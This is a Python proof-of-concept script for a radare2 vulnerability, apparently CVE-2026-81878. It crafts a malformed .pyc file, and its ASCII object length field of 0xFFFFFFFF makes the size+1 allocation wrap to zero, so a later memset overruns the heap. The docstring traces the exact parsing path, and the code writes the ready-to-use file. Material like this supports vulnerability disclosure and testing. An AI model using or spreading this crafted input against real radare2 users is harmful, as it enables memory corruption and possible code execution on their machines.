#!/usr/bin/env python3
"""Craft a minimal .pyc that drives radare2's real marshal ASCII reader.

CVE-2026-81878 / GHSA-9phv-v2w8-56j3. No external target is contacted.

Layout (all integers little-endian):

  0x00  ut32  magic 0x0a0d0d2c ("v3.6.0a2" in pyc_magic.c)
  0x04  4 bytes padding
  0x08  u8    0x63 TYPE_CODE_v1 -- pyc_is_code() recognises this
  0x09  20 bytes zero code header for v3.6: argcount, kwonlyargcount,
        nlocals, stacksize, flags (each ut32)
  0x1d  5 bytes filler
  0x22  u8    0x61 TYPE_ASCII, then ut32 length, then 16 payload bytes

Why 0x22: bin_pyc.c get_entrypoint() sees the code byte at 0x08, seeks to
0x09 and calls get_code_object_addr(); with refs == NULL get_code_object()
returns r_buf_tell() + 5 == 0x09 + 20 + 5 == 0x22. symbols_vec() seeks to
that offset and calls pyc_get_sections_symbols() -> get_object(), which
dispatches TYPE_ASCII to get_ascii_object() -> get_bytes() -> r_buf_read().
At length 0xffffffff the (ut32) size+1 allocation wraps to zero and the
padded memset in r_buf_read() runs past the chunk.
"""

import argparse
from pathlib import Path

MAGIC = 0x0A0D0D2C
ASCII = 0x61
TYPE_CODE_V1 = 0x63
PAYLOAD = b"A" * 16

HERE = Path(__file__).resolve().parent


def craft(length: int) -> bytes:
    data = bytearray()
    data += MAGIC.to_bytes(4, "little")
    data += b"\x00" * 4
    data += bytes([TYPE_CODE_V1])
    data += b"\x00" * 20
    assert len(data) == 0x1D, hex(len(data))
    data += b"\x00" * 5
    assert len(data) == 0x22, hex(len(data))
    data += bytes([ASCII])
    data += length.to_bytes(4, "little")
    data += PAYLOAD
    return bytes(data)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default=str(HERE / "crafted-ascii.pyc"))
    ap.add_argument("--length", type=lambda s: int(s, 0), default=0xFFFFFFFF)
    args = ap.parse_args()
    Path(args.out).write_bytes(craft(args.length))


if __name__ == "__main__":
    main()
